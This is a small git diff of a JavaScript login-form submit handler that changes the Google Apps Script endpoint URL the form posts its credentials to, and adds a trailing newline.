@@ -5,7 +5,7 @@ document.getElementById('loginForm').addEventListener('submit', function (event)
     const password = document.getElementById('password').value;
     const feedback = document.getElementById('feedback');
 
-    fetch("https://script.google.com/macros/s/AKfycbz7U_iR3rfV1MYmpyQFQhVI0urefi5pL3ymF-UhbprFtdSNtEtuBqzIQlPrWyUuHZqg3w/exec", {
+    fetch("https://script.google.com/macros/s/AKfycbyiuQssnEkx3eK9D5sg9tKaKt1vq4LN1gZbbBAbwAXqhPXHQOOWGYGWbZZ2IXeTKvBpLw/exec", {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
@@ -38,3 +38,4 @@ document.getElementById('loginForm').addEventListener('submit', function (event)
 });
 
 });
+
